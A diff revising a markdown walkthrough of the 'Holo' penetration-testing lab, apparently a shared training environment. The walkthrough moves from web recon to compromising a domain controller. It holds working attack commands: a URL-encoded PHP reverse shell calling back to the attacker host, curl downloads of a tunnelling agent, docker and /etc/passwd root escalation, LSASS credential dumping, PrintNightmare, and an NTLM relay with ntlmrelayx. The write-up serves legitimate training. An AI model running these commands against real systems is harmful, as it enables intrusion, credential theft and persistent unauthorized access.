@@ -762,7 +762,7 @@ Connect to VPN and check your route:
 
     10.200.95.0     10.50.74.1      255.255.255.0   UG    1000   0        0 tun0
 
-Check your IP
+Check your VPN IP
 
     tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
     inet 10.50.74.35  netmask 255.255.255.0  destination 10.50.74.35
@@ -790,7 +790,7 @@ Fast check open ports for the 2 hosts:
     80/tcp    open  http    syn-ack
     33060/tcp open  mysqlx  syn-ack
 
-Identify services on .33
+Identify services on L-SRV01
 
     sudo nmap -sVC -n -v -p 80,22,3306 10.200.95.33
     ...
@@ -828,7 +828,7 @@ As suggested we can now try to discover other VHost
 
 The fw command helps to filter false positive responses, that I don't know why, return 200 for every  word in the list.
 
-    -fw                 Filter by amount of words in response. Comma separated list of word counts and ranges
+    -fw       Filter by amount of words in response. Comma separated list of word counts and ranges
 
 We can proceed to add the new two virtual host to our hosts file. Then I proceeded to scan the host with Nikto:
 
@@ -838,14 +838,14 @@ We can proceed to add the new two virtual host to our hosts file. Then I proceed
     + /robots.txt: contains 21 entries which should be manually viewed.
     ...
 
-Inspecting http://www.holo.live/robots.txt I found nothting, then I tried for the other sub-domains. dev is not found, but admmin reveals interesting information:
+Inspecting http://www.holo.live/robots.txt I found nothting, then I tried for the other sub-domains. admmin reveals interesting information:
 
     User-agent: *
     Disallow: /var/www/admin/db.php
     Disallow: /var/www/admin/dashboard.php
     Disallow: /var/www/admin/supersecretdir/creds.txt
 
-Of course the access to the directory is forbidden.
+Of course the access to the supersecretdir directory is forbidden.
 
 Insepcting the source code for the application I found an interesting url parameter used to load images: view-source:http://dev.holo.live/talents.php
 
@@ -862,7 +862,7 @@ The file is downloaded as img.php and inside we can filnd some credentials.
 
 I used the credentials to access the admin app. Once logged in we can see that there is nothing we can do in pratical, I mean no way to upload o inject a webshell. Again inspecting the souce of the page I found an interesting comment:
 
-    <!--                   //if ($_GET['cmd'] === NULL) { echo passthru("cat /tmp/Views.txt"); } else { echo passthru($_GET['cmd']);} -->
+    <!--   //if ($_GET['cmd'] === NULL) { echo passthru("cat /tmp/Views.txt"); } else { echo passthru($_GET['cmd']);} -->
 
 This a PHP insturction, interesting enough has been commented using HTML, so It is rendered on the client side, indeed to use server side PHP comment. Let's try to check if there is already a webshell installed for us :):
 
@@ -901,8 +901,6 @@ Once I got a shell, inspecting network configuration:
     eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 192.168.100.100  netmask 255.255.255.0
 
-### Flag submission 1
-In /var subdirs you can find the first flag.
 
 ### Trying Privilege escaltion
 At this point I performed some basic controls to try to escalate my privileges. I searched for files containing juicy information:
@@ -913,15 +911,14 @@ At this point I performed some basic controls to try to escalate my privileges. 
     ...
 
 Nothing really interesting emerged. 
-
 I searched for SUID file, but again, with no luck:
 
     find / -perm -u=s -type f 2>/dev/null
-   
-Performing other activities to find a way to escalate my privilege, but I didn't find anything
+    ...
+Performing other activities to find a way to escalate my privilege, but I didn't find anything.
 
 ### Pivoting
-At this point I decided to move forward and perform an host scan on the subnet using the compromised machine as pivot host. As usual to perform this task I use Ligolo-NG. I downloaded the agent from attacker machine, since wget it's not installed I used curl:
+At this point I decided to move forward and perform an hosts scan on the subnet  192.168.100.0/24 using the compromised machine as pivot host. As usual to perform this task I use Ligolo-NG. I downloaded the agent from attacker machine, since wget it's not installed I used curl:
 
     cd /tmp && curl -O http://10.50.74.35:8000/agent
     chmod u+x agent
@@ -1052,7 +1049,7 @@ Then we can access the web shell using the following URL:
     http://192.168.100.1/ws.php?c=whoami
 
 <b>Oops! That page can’t be found.</b>
-Damn, so I tried with the other http port available
+Damn, so I tried with the other http port available on the server:
 
     http://192.168.100.1:8080/ws.php?c=whoami
 
@@ -1060,12 +1057,11 @@ This time it worked:
 
     www-data
 
-At this point we can get a shell using the same payload we used before (remember to start a nc listener on the attacker machine on port 1222
+At this point we can get a shell using the same payload we used before (remember to start a nc listener on the attacker machine on port 1222):
 
      http://192.168.100.1:8080/ws.php?c=php%20-r%20%27%24sock%3Dfsockopen%28%2210.50.74.35%22%2C1222%29%3Bexec%28%22%2Fbin%2Fbash%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
 
-### Flag submissions 2 and 3
-Futher investigate the server we notice that the webapp is actually a Docker container, and that the ssh server is active on the Docker interface as well (very insecure configuration):
+Futher investigate the server we notice that the running web app is actually a Docker container, and that the ssh server is active on the Docker interface as well (very insecure configuration):
 
     www-data@ip-10-200-95-33:/var/www/html$ ifconfig 
     br-19e3b4fa18b8: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
@@ -1096,7 +1092,7 @@ The last result row is the one we can use as value for the parameter. The comman
 
     docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt bash
     the input device is not a TTY
-Investigating the error, since our current shell is not a full TTY, the solution is to get rid of the t option. So the command to exploit it is:
+Investigating the error, since our current shell is not a full TTY, the solution is to get rid of the -t option. So the actual command to exploit it is:
 
     docker run -v /:/mnt --rm -i ubuntu:18.04 chroot /mnt bash
     <r run -v /:/mnt --rm -i ubuntu:18.04 chroot /mnt sh
@@ -1111,7 +1107,7 @@ Since ssh is enabled I decided to create a new user to have a persistent access 
     Retype new password: Pwd1234
     passwd: password updated successfully
 
-Then we can login with ssh using the host IP, so we don't to use the ligolo tunnell anymore:
+Then we can login with the newly created user using the host VPN IP:
 
     ssh support-it@10.200.95.33
     ...
@@ -1142,7 +1138,7 @@ Then we can insert at the end of the /etc/passwd file the following line:
     ....
     support-su:$6$xyz$QPpRe.vKRkmPLc0hZLHMNMuoYIM96CzLbWVluRaUH3NPycNnP6Z4WiGcI6v/kM7yDZu7rJALqIc8Pvgu64Akt.:0:0:root:/root:/bin/bash
 
-Actually we are inserting an alias for the root user called support-su. Now we can even login with ssh using the new added user:
+Actually we are inserting an alias for the root user called <b>support-su</b>. Now we can proceed to login with ssh using the newly added user:
 
     ssh support-su@10.200.95.33
     ...
@@ -1157,7 +1153,7 @@ From this host we can perform a further host discovery on the 10.200.95.0/24 sub
     root@ip-10-200-95-33:~# whereis nmap
     nmap: /usr/bin/nmap /usr/share/nmap /usr/share/man/man1/nmap.1.gz
 
-We can proceed to perform an hosts discovery from the server. <b>Note that we have already performed this scan through the VPN in the initial phase, but we were not able to reach all the available hosts</b>
+<b>Note that we have already performed this scan through the VPN in the initial phase, but we were not able to reach all the available hosts</b>
 
     nmap -sn  10.200.95.0/24
     Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-11 07:35 UTC
@@ -1183,7 +1179,7 @@ We can proceed to perform an hosts discovery from the server. <b>Note that we ha
     Host is up.
     Nmap done: 256 IP addresses (7 hosts up) scanned in 1.70 seconds
 
-So we have 5 hosts, excluding the IP .33 (current machine), .1 is the GW, we can proceed with services fingerprint as follows:
+So we have 5 hosts, excluding L-Srv01 (current machine) and 10.200.95.1 that is the GW. We can proceed with services fingerprint as follows:
 
     nmap -sVC -n 10.200.95.30,31,32,35,250
     
@@ -1376,10 +1372,10 @@ So we have 5 hosts, excluding the IP .33 (current machine), .1 is the GW, we can
 
 From the above results we can infer that:
 - .30 host is the DC:  DC-SRV01.holo.live
-- .31:  S-SRV01.holo.live
+- .31: S-SRV01.holo.live
 - .32: S-SRV02.holo.live
 - .35 is probably a windows file server:  PC-FILESRV01.holo.live
-- .250 is *nix box having hosting SSH server and it seems not to be part of the domain. I willfocus on the domain's hosts.
+- .250 is *nix box having hosting SSH server and it seems not to be part of the domain. I focused on the domain's hosts.
 
 To spped up the interactions, we can create another ligolo tunnell to reach these hosts directly.
 Again I downloaded the agent from my attacker machine on the compromised server:
@@ -1466,17 +1462,19 @@ I got the following response:
     An email has been sent to the email associated with your username
 
 So the user exists. But I don't have access to the token of course. I decided to inspect the flow using Burp. Inspecting the reset request I found that the user token is also returned as cookie:
--->
+
+    Request -->
 
     GET /password_reset.php?user=gurag&user_token= HTTP/1.1
     ...
-<--
+    
+    <-- Response
     
     HTTP/1.1 200 OK
     ...
     Set-Cookie: user_token=934e02cb6c5c6f5d345b55bedb26940c42a7f17ffa119d400ba154ea3ec0b69d860002b8053f27513b6b5440a0a7d5d52dfb
 
-Actually this thing it's not so strange, sometime during the development of an application such type of things could be present in order to test an app. Anyway, let's try to append the cookie value to the QS parameter:
+Actually this thing it's not so strange, sometime during the development of an application such type of things could be implemented in order to test authentication and authorization workflow. Anyway, let's try to append the cookie value to the query string parameter:
 
     http://10.200.95.31/password_reset.php?user=gurag&user_token=934e02cb6c5c6f5d345b55bedb26940c42a7f17ffa119d400ba154ea3ec0b69d860002b8053f27513b6b5440a0a7d5d52dfb
 
@@ -1489,7 +1487,7 @@ You get a positive response:
     Password successfuly updated!
     HOLO{.......................}
 
-Then we can proceed to login using the new password. Then we are presented with a button to uoload an image, clicking we are redirected to:
+Then we can proceed to login using the newky set password. Then we are presented with a button to uoload an image, clicking we are redirected to:
 
     http://10.200.95.31/img_upload.php?
 
@@ -1565,26 +1563,24 @@ Since the server has RDP enabled we can create a local admin user:
     net localgroup administrators support /add
     net localgroup "Remote Desktop Users" support /add
 
-Then we can proceed to connect to the server with RDP, using Remmina. Then I set a Defender exclusion folder for:
+Then we can proceed to connect to the server using Remmina. Once logged I set a Defender exclusion folder for:
 
     C:\users\support\music
 
-### Flag submission 
-You can find the flag in the administrator desktop folder.
 
-Now that we compromised a domain machine we can try to get in control of the DC. To do that we need to get at first the credentials of the domain users. The first choice would be to try to dump LSASS to try to get some hashed password (or if we are lucky enough even clear password, in case of NTLM). But as we known probably credentials guard is in place, since we are on Server 2019. We can verify using the following command in powershell (run as administrator):
+Now that we compromised a domain machine, we can try to get in control of the DC. To do that generally involves to get at first the credentials of the domain user. The first choice would be to try to dump LSASS to try to get some hashed password (or if we are lucky enough even clear password. But as we known, probably credentials guard is in place. We can verify I using the following command in powershell (run as administrator):
 
     Get-CimInstance –ClassName Win32_DeviceGuard –Namespace root\Microsoft\Windows\DeviceGuard
     ...
     SecurityServicesConfigured                   : {0}
     SecurityServicesRunning                      : {0}
     ...
-Since both 0 are returned for the settings showed above, it means that credentials guard is not enabled. Further more we can verify if we have privilege (we should since we are local admin) to dump LSASS:
+Since both 0 are returned for the settings showed above, INDEED it means that credentials guard is not enabled. Further more we can verify if we have privilege (we should since we are local admin) to dump LSASS:
 
-     whoami /priv | findstr SeDebug
-        SeDebugPrivilege                          Debug programs                                                     Enabled
+    whoami /priv | findstr SeDebug
+    SeDebugPrivilege                          Debug programs                                                     Enabled
 
-At this point I decided to use the port of Mimikatz in C# [SharpKatz](https://github.com/b4rtik/SharpKatz), since it can be compiled by your own and eventually you can modify the source code to evade AV. Eventually I'm more confident with C#. For this Lab it was enough run the compiled file from the excluded folder. Defender did not complain. To download the file from our attacker machine we need to set up another listener in ligolo to access our python webserver throught the agent. Follows the command to execute in liglolo console:
+At this point I decided to use the port of Mimikatz in C# [SharpKatz](https://github.com/b4rtik/SharpKatz), since it can be compiled by yourown and eventually you can modify the source code to try to evade AV. Eventually I'm more confident to make changes in C# code. For this Lab it was enough to run the compiled file from the excluded Defender folder. To download the file from our attacker machine we need to set up another listener in ligolo, to access our python webserver throught the agent. Follows the command to execute in liglolo console:
 
     [Agent : root@ip-10-200-95-33] » listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:8000 --tcp
 
@@ -1620,13 +1616,13 @@ Inspecting the file content we can find a clear password for a domain user:
     ,,,
     
 [//]: # (Nothingtoworry!)
-This happens since Windows historically stored cleartext passwords in RAM, with lsass process when an intercatvie logon session take place.
+This happens since Windows historically stored cleartext passwords in RAM, using lsass process, when an intercatvie logon session take place.
 I tried to kerberosting service account users, but this time no luck:
 
     impacket-GetUserSPNs -outputfile kerberoastables.txt -dc-ip 10.200.95.30  'holo.live/watamet:Nothingtoworry!'
     ...
     No entry founds
-So we have to proceed to the Lab path that involves compromise PC-FILESRV01. First we login through RDP with the domain account that we have found.
+So following the Lab path, that involves compromise PC-FILESRV01, I logged on this system through RDP, using the domain account that we have found before (watamet):
 Let's check how privileges on the machine:
 
     net user watamet /domain
@@ -1674,22 +1670,23 @@ Neither seatbelt works:
     C:\Users\watamet\Music>Seatbelt.exe
     This program is blocked by group policy. For more information, contact your system administrator.
 
-Ok, let's try something using powershell, since AMSI seems not enabled:
+Since powershell seems not protected by AMSI:
 
     PS C:\Users\watamet> "mimikatz"
     mimikatz
 
-At this point I tried with PrivescCheck, that works quite well. The command below generate an HTML report, very useful.
+I decided to try with <b>PrivescCheck</b>, that works quite well. <b>Note: with Remmina you can simply copy & paste the source of the Powershell script in a new textual file on the victim machine. The change the file exstension to ps1</b>
+The command below generate an HTML report:
 
     PS C:\Users\watamet\Music> powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format HTML"
 
-Nothin really important emerged. THe only useful information is that the last installed KB goes back to 2020:
+Nothing really important emerged. THe only useful information is that the last installed KB goes back to 2020:
 
     KB4587735 Security Update NT AUTHORITY\SYSTEM 11/11/2020 12:00:00 AM
     KB4586793 Security Update NT AUTHORITY\SYSTEM 11/11/2020 12:00:00 AM
     ...
 
-Then I proceed to investigate which vulnerabilities we could exploit to escalate our privilege. Actually I did not found too much, so I had a look to other writeup and it's reported that the server is vulnerable to the so-called PrinterNightmare (CVE-2021-1675). Since I didn't know too much about this vulnerability, since I have never had the occasion to use it, I took a break to go [deeper on the matter](https://itm4n.github.io/printnightmare-exploitation/)
+Then I proceed to investigate which vulnerabilities we could exploit to escalate our privilege. Actually I did not found too much, so I had a look to other writeup and it's reported that the server is vulnerable to the so-called PrinterNightmare (CVE-2021-1675). I didn't know too much about this vulnerability, since I have never had the occasion to use it, I took a break to go [deeper on the matter](https://itm4n.github.io/printnightmare-exploitation/)
 First we need to check if the printer remote spool is activated:
     
     impacket-rpcdump @10.200.95.35 | grep -A 10 MS-RPRN
@@ -1709,27 +1706,28 @@ As we have alredy seen, since powershell is not blocked by AMSI, I found that a 
     [+] added user support.it as local administrator
     [+] deleting payload from C:\Users\watamet\AppData\Local\Temp\2\nightmare.dll
 
-Verify if we can get a cmd as administrator:
+Verify if we can get a cmd shell as administrator:
 
     PS C:\Users\watamet\Music> runas /user:support.it cmd.exe
     Enter the password for support.it:
     Attempting to start cmd.exe as user "PC-FILESRV01\support.it" ...
 
-A new administrator cmd window should appear. I added the created user to the remote desktop group:
+A new administrator cmd window should appear. With this shell I added the created user to the remote desktop group:
 
     net localgroup "Remote Desktop Users" support.it /add
 
-And I logged in as the newly created user to PC-FILESRV01, with RDP
+And I logged in PC-FILESRV01 as support.it, using Remmina.
 
-The next target is the domain controller. As we know we have to set up an NTML relay attack. The main problem here is that our attacker machine is not directed connected to the holo network, so we need to forward the traffic to us. The others requiremnts are satisfied since:
-- We have compromised with administrator privileges: PC-FILESRV01
-- THe target host has not SMB strict sign enabled: DC-SRV01
+### Compromise the DC
+The next target is the domain controller. As we know we have to set up an NTML relay attack. The main problem here is that our attacker machine is not directed connected to the holo network, so we need to set up a remote relay. The others requiremnts to perform such attack are already satisfied:
+- We have a compromised host with administrator privileges: PC-FILESRV01
+- THe target host has not SMB packet strict sign enabled: DC-SRV01
 
-The other server (S-SRV02) inside the network cannot be use as target since SMB is not enabled. As said before, since we need to forward the SMB traffic from the compromoside host (PC-FILESRV01) to our attacker machine. To accomplish the task first I set another listener to the Ligolo agent on 10.200.95.33. This lisstener will forward all the SMB traffic from the agent (10.200.95.33) to our attacker machine, this will become clearer later:
+The other server (S-SRV02) inside the network cannot be use as target since SMB is not enabled on this host. As said before, we need to forward the SMB traffic from the compromoside host (PC-FILESRV01) to our attacker machine. To accomplish the task, first I set another listener to the Ligolo agent on 10.200.95.33. This lisstener will forward all the SMB traffic from the agent (10.200.95.33) to our attacker machine, this will become clearer later:
 
-    listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp
+    [Agent : root@ip-10-200-95-33] » listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp
 
-Now we need to perform an invasive action, since we are going to stop all SMB related services and reboot the system in order to free port 445. Perform the following commands in a CMD running as administrator:
+Now we need to perform an invasive action (hoping that the blue team guys are on vacation :)), since we are going to stop all SMB related services and reboot the system, in order to free port 445. Let's proceed to perform the following commands in a CMD running as administrator:
    
     sc stop netlogon
     sc stop lanmanserver
@@ -1738,7 +1736,7 @@ Now we need to perform an invasive action, since we are going to stop all SMB re
     sc stop lanmanworkstation
     sc config lanmanworkstation start= disabled
 
-Then reboot the server. Wait a couple of minutes and connect back to the server. <b>If you use Remmina, sice it requires Netlogon service, it will fail. The only tool that works is Rdesktop</b>:
+Then reboot the server. Wait a couple of minutes and connect back to the server. <b>If you use Remmina so far, since it requires Netlogon service to be active on the host, it will fail. The only tool that works is Rdesktop</b>:
 
     rdesktop -u support.it 10.200.95.35
 
@@ -1746,20 +1744,20 @@ Verify that SMB is off:
 
     netstat -an | findstr :445
 
-Should return nothing. If you find that a service is still running probably is due to a firewall port forwarding rule left active from other user (e.g using meterpreter). Check it out with:
+Should return nothing. <b>If you find (like me) that a service is still running on port 445, probably is due to a firewall port forwarding rule left active from other user (e.g using meterpreter port forward).</b> Check it out with:
 
     netsh interface portproxy show all
-Check the clean up section on how to delete a rule.
+Check the clean up section on how to delete such rules.
 
-At this point I set a portforwarding rule in PC-FILESRV01 to forward incoming SMB traffic to the agent (see the above listener).
+At this point I set a portforwarding rule in PC-FILESRV01 to forward incoming SMB traffic to the agent, according to the previous listener we set.
 
     netsh interface portproxy add v4tov4 listenport=445 listenaddress=10.200.95.35 connectport=445 connectaddress=10.200.95.33
 
-So the flow we set up is:
+So the whole SMB flow we set up is:
 
-    Incoming SMB req. to PC-FILESRV01 --> FW rules forwards the request to ligolol agent (10.200.95.33) listener (445) --> the listener forward SMB request to our attacker machine
+    Incoming SMB request to PC-FILESRV01 --> FW rules forwards the request to ligolol agent (10.200.95.33) listener (445) --> the listener forward SMB request to our attacker machine
 
-Now on our attacker machine start the relay listener
+Now on our attacker machine starts the relay listener:
 
     impacket-ntlmrelayx -t smb://10.200.95.30 -smb2support -socks
 
@@ -1771,7 +1769,7 @@ In a while we should recive the request:
     [*] SOCKS: Adding HOLOLIVE/SRV-ADMIN@10.200.95.30(445) to active SOCKS connection. Enjoy
     ...
 
-Now we have an active socks on port 1080 that we can exploit. To intercat with this sock we can use proxychains. Change the configuration file as follows:
+Now we have an active socks on port 1080 that we can exploit. To intercat with this sock we can use proxychains. Change its configuration file at the end as follows:
 
     cat /etc/proxychains.conf  
     ...
@@ -1782,7 +1780,8 @@ Now we have an active socks on port 1080 that we can exploit. To intercat with t
     #socks4         127.0.0.1 9050
     socks4          127.0.0.1 1080
 
-<b>Note that on Kali 2024.2 the defaul configuration file is /etc/proxychains4.conf and you need to renamed it</b>. Finally we can perform the last step, to get a shell in the Domain controller:
+<b>Note that on Kali 2024.2 the defaul configuration file is /etc/proxychains4.conf and you need to renamed it</b>. 
+Finally we can perform the last command, to get a shell inside the Domain controller:
 
     proxychains impacket-smbexec -no-pass HOLOLIVE/SRV-ADMIN@10.200.95.30
 
@@ -1802,10 +1801,10 @@ Then I added a new user to the administrator group:
     net localgroup Administrators /add support.it
     net localgroup "Remote Desktop Users" /add support.it
 
-Log to rdp and find the last flag.
+Log in to DC through RDP and find the last flag.
     
 ### Clean Up
-Sinc the lab is shared it's a good practice to restore the services on PC-FILESRV01. Perform the following action in a CMD as administrator:
+Since the lab is shared with other users, it's a good practice to restore the services we stopped and remove the port forwarding rule on PC-FILESRV01. Perform the following action in a CMD as administrator:
 Delete FW rule:
 
     netsh interface portproxy delete v4tov4 listenport=445 listenaddress=10.200.95.35
